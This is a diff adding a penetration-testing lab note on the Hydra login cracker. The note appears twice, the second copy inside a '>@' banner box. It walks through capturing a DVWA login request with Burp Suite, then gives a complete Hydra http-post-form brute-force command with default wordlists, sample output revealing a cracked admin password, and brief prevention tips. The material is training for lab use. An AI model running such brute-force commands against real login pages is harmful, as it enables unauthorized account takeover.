@@ -1,0 +1,110 @@
+Hydra | THC Hydra
+
+Hydra (or THC Hydra) is a parallelized network login cracker built into various operating systems like Kali Linux, Parrot 
+and other major penetration testing environments. It was created as a proof of concept tool, for security researchers to 
+demonstrate how easy it can be to crack logins. Hydra works by using different approaches, such as brute-force attacks 
+and dictionary attacks, in order to guess the right username and password combination. Hydra is commonly used by penetration 
+testers together with a set of programmes like crunch, cupp etc, which are used to generate wordlists based on user-defined 
+patterns. 
+
+See: https://github.com/vanhauser-thc/thc-hydra
+
+-> Prepare systems
+  Start Burp Suite and put Intercept at On (folder Proxy). 
+  Use DVWA (<metasploitable IP> then choose DVWA. Type "admin" and a random password, ie "pass".
+  In Burp, go to the Request part (bottom), choose folder Pretty then copy the data:
+    username=admin&password=pass&Login=Login
+  In Burp, stop Interception.
+   
+-> Use hydra
+* Help me
+  $ hydra -h    |    man hydra
+
+  -l <login>         : give a unique login.
+  -L <login file>    : give a file containing a list of users.
+  -p <password>      : give a unique password.
+  -P <password file> :
+  -I                 : ignore last session (don't wait for 10 s).
+  -e n|s|r           : specify rule for admin/password. With n: null password.
+                                                             s: password same as login.
+                                                             r: password is reverse login (ie toor for root).
+  -d                 : debug mode.
+  -V                 : verbose mode.
+
+* Use it (this is an example)
+$ hydra -L /usr/share/wordlists/metasploit/http_default_users.txt -P /usr/share/wordlists/metasploit/http_default_pass.txt 
+        -V -I <ms IP> http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"
+
+>>> the result:
+...
+[ATTEMPT] target ms - login "manager" - pass "manager" - 22 of 266 [child 10] (0/0)
+[ATTEMPT] target ms - login "manager" - pass "letmein" - 23 of 266 [child 0] (0/0)
+[80][http-post-form] host: ms   login: admin   password: password
+[ATTEMPT] target ms - login "manager" - pass "cisco" - 24 of 266 [child 2] (0/0)
+[ATTEMPT] target ms - login "manager" - pass "default" - 25 of 266 [child 6] (0/0)
+...
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-02-03 12:43:45
+
+-> Prevent Hydra
+  -Don't use easy passwords.
+  -Limit the number of access to a login. Block next attemps for an amount of time.
+>@
+>@###################################################################################################################################
+>@#                                                                                                                                 #
+>@# [ Hydra | THC Hydra ]                                                                                                           #
+>@#                                                                                                                                 #
+>@# Hydra (or THC Hydra) is a parallelized network login cracker built into various operating systems like Kali Linux, Parrot       #
+>@# and other major penetration testing environments. It was created as a proof of concept tool, for security researchers to        #
+>@# demonstrate how easy it can be to crack logins. Hydra works by using different approaches, such as brute-force attacks          #
+>@# and dictionary attacks, in order to guess the right username and password combination. Hydra is commonly used by penetration    #
+>@# testers together with a set of programmes like crunch, cupp etc, which are used to generate wordlists based on user-defined     #
+>@# patterns.                                                                                                                       #
+>@#                                                                                                                                 #
+>@# See: https://github.com/vanhauser-thc/thc-hydra                                                                                 #
+>@#                                                                                                                                 #
+>@#---------------------------------------------------------------------------------------------------------------------------------#
+>@
+>@-> Prepare systems
+>@  Start Burp Suite and put Intercept at On (folder Proxy). 
+>@  Use DVWA (<metasploitable IP> then choose DVWA. Type "admin" and a random password, ie "pass".
+>@  In Burp, go to the Request part (bottom), choose folder Pretty then copy the data:
+>@    username=admin&password=pass&Login=Login
+>@  In Burp, stop Interception.
+>@   
+>@-> Use hydra
+>@* Help me
+>@  $ hydra -h    |    man hydra
+>@
+>@  -l <login>         : give a unique login.
+>@  -L <login file>    : give a file containing a list of users.
+>@  -p <password>      : give a unique password.
+>@  -P <password file> :
+>@  -I                 : ignore last session (don't wait for 10 s).
+>@  -e n|s|r           : specify rule for admin/password. With n: null password.
+>@                                                             s: password same as login.
+>@                                                             r: password is reverse login (ie toor for root).
+>@  -d                 : debug mode.
+>@  -V                 : verbose mode.
+>@
+>@* Use it (this is an example)
+>@$ hydra -L /usr/share/wordlists/metasploit/http_default_users.txt -P /usr/share/wordlists/metasploit/http_default_pass.txt 
+>@        -V -I <ms IP> http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"
+>@
+>@>>> the result:
+>@...
+>@[ATTEMPT] target ms - login "manager" - pass "manager" - 22 of 266 [child 10] (0/0)
+>@[ATTEMPT] target ms - login "manager" - pass "letmein" - 23 of 266 [child 0] (0/0)
+>@[80][http-post-form] host: ms   login: admin   password: password
+>@[ATTEMPT] target ms - login "manager" - pass "cisco" - 24 of 266 [child 2] (0/0)
+>@[ATTEMPT] target ms - login "manager" - pass "default" - 25 of 266 [child 6] (0/0)
+>@...
+>@1 of 1 target successfully completed, 1 valid password found
+>@Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-02-03 12:43:45
+>@
+>@-> Prevent Hydra
+>@  -Don't use easy passwords.
+>@  -Limit the number of access to a login. Block next attemps for an amount of time.
+>@
+>@###################################################################################################################################
+>@
